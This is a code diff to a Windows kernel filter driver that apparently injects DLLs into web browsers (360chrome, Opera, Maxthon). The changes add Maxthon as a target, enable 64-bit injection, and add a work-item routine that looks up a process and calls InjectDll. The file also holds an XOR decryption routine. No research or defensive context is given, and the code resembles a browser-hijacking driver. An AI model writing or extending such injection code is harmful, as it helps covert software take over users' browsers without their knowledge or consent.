@@ -81,7 +81,7 @@ Return Value:
 
     UNREFERENCED_PARAMETER( RegistryPath );
 
-
+	g_drobj=DriverObject;
 
     //  Register with FltMgr
 
@@ -100,6 +100,9 @@ Return Value:
     AppendListNode(L"360chrome.exe");
     AppendListNode(L"360chrome.exe");
     AppendListNode(L"opera.exe");
+	AppendListNode(L"Maxthon.exe");
+
+	
 
 #ifdef _AMD64_
     //x64 add code
@@ -1962,6 +1965,7 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
 	  						 BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
 	  						 if(bfind == TRUE && IsByInjectProc(exename)) {
 	  							 kprintf("[ImageNotify] x64 32 bit inject pid:%x",PsGetCurrentProcessId());
+//								 newWorkItem(32);
 	  							 InjectDll(ProcessObj, 32);
 	  						 }
 	  					 }
@@ -1970,13 +1974,9 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
 //				 						kprintf("x86 pPEB:%p pid:%d",pPEB,PsGetCurrentProcessId());
 										
 				 }else  if(pPEB && (ULONG64)pPEB > (ULONG64)0xFFFFFFFF){
-//					kprintf("x64 pPEB:%p pid:%d",pPEB,PsGetCurrentProcessId());
+					 kprintf("[ImageNotify] x64 32 bit inject pid:%x",PsGetCurrentProcessId());
+					 InjectDll(ProcessObj, 64);
 				 }
-
-
-//				 x64 pPEB:00000000xFFFFFFFF
-
-
 
 //                  kprintf("pPEB:%p pfind:%ws",pPEB,pfind);
 //                  if(pPEB && (ULONG64)pPEB < (ULONG64)0x7FFFFFFF) {
@@ -2000,7 +2000,8 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
             if (TRUE) {
                 BOOLEAN   bfind=GetProcessNameByObj(ProcessObj,exename);
                 if (bfind&&IsByInjectProc(exename)) {
-                    InjectDll(ProcessObj, 32);
+					newWorkItem(32);
+//                    InjectDll(ProcessObj, 32);
                 }
             }
 #endif
@@ -2355,5 +2356,59 @@ void MyDecryptFile(PVOID pdata, int len)
     for(i = 0; i < len; i++) {
         p1[i] = 16 ^ p1[i];
     }
+}
+
+
+void  newWorkItem(ULONG bit)
+{
+    PIO_WORKITEM pIoWorkItem;
+     pIoWorkItem = IoAllocateWorkItem(g_drobj);
+     if (pIoWorkItem)
+     {
+         PWORKITEMPARAM pitemparam =   (PWORKITEMPARAM)kmalloc(sizeof(WORKITEMPARAM));
+         if (pitemparam)
+         {
+             pitemparam->pid = PsGetCurrentProcessId();
+             pitemparam->bit = bit;
+             IoInitializeWorkItem(g_drobj, pIoWorkItem);
+             IoQueueWorkItemEx(pIoWorkItem, (PIO_WORKITEM_ROUTINE_EX)WorkerItemRoutine, DelayedWorkQueue, pitemparam);
+         } else
+         {
+             IoFreeWorkItem(pIoWorkItem);
+         }
+     }
+
+}
+
+  
+VOID WorkerItemRoutine(PDEVICE_OBJECT  DeviceObject, PVOID  Context, PIO_WORKITEM IoWorkItem)
+{
+    NTSTATUS                    status;
+    LARGE_INTEGER                localTime;
+    IO_STATUS_BLOCK                ioStatus;
+    FILE_BASIC_INFORMATION        flBscInfo;
+    DbgPrint("call WorkerItemQueryFileInfoRoutine Context:%x", Context);
+
+    if (MmIsAddressValid(Context))
+    {
+        PWORKITEMPARAM pParam = (PWORKITEMPARAM)Context;
+        PEPROCESS ProcessObj = NULL;
+
+
+        kprintf("pid:%x bit:%d", pParam->pid, pParam->bit);
+
+        if (NT_SUCCESS(PsLookupProcessByProcessId( pParam->pid, &ProcessObj)))
+        {
+
+                InjectDll(ProcessObj, pParam->bit);
+                ObfDereferenceObject(ProcessObj);
+        }
+
+        kfree(pParam);
+    }
+    IoUninitializeWorkItem(IoWorkItem);
+    IoFreeWorkItem(IoWorkItem);
+
+
 }
 
